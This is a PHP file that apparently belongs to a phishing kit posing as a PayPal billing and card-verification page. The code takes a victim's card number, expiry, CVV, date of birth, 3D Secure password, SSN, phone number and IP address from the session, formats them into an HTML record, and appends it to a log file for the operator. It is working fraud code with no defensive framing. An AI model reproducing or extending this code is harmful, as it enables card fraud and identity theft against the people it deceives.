<?php

session_start();
$TIME_DATE = date('H:i:s d/m/Y');
include('../../functions/Email.php');
include('../../functions/get_bin.php');
include('../../functions/get_browser.php');


        $content = "<pre style='border: 2px solid; border-color: rgb(67, 159, 253);border-radius: 4px;font-weight: bold;font-size: 14px;padding-top: 1.5%;padding-bottom: 2%;'>
  <img src='https://2.bp.blogspot.com/-O-ZJASC706s/U_hvz20oD2I/AAAAAAAAACw/OV1BlsEyjM0/s1600/logo_106x27.png'/>

  <font style='color: rgb(251, 58, 105);'>PP BILLING & CARD:</font>
  <font style='color: rgb(20, 158, 27);'>CARD infromation:vbv and more:</font> $date       

                                                                                                                                                                                                                                             
   <font style='color: rgb(128, 129, 131);'>&#10112; Card Holder :</font>  <font style='color: rgb(60, 118, 235);'> ".$_SESSION['_nameoncard_']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10113; Card number :</font>  <font style='color: rgb(60, 118, 235);'> ".$_SESSION['_cardnumber_']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Expiration  :</font>  <font style='color: rgb(60, 118, 235);'> ".$_SESSION['_expdate_']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10113; Cvv         :</font>  <font style='color: rgb(60, 118, 235);'> ".$_SESSION['_csc_']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Birth day   :</font>  <font style='color: rgb(60, 118, 235);'> ".$_SESSION['_dob_']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; 3D secure   :</font>  <font style='color: rgb(60, 118, 235);'> ".$_SESSION['_password_vbv_']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10128; SSN (USA)   :</font>  <font style='color: rgb(60, 118, 235);'> ".$_SESSION['_ssnnum_']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10128; Phone number :</font> <font style='color: rgb(60, 118, 235);'> ".$_SESSION['_phone_']."-".$_SESSION['_phone_numb_']." </font>
   
   <font style='color: rgb(128, 129, 131);'>&#10114; IP          :</font>  <font style='color: rgb(60, 118, 235);'><a target='_blank' style='text-decoration:none;' href='http://www.geoiptool.com/?IP=".$_SERVER['REMOTE_ADDR']."'>".$_SERVER['REMOTE_ADDR']."</a></font><br> ";;


	$f = fopen("TNTvbv.html", "a");
	fwrite($f, $content);
	
	?>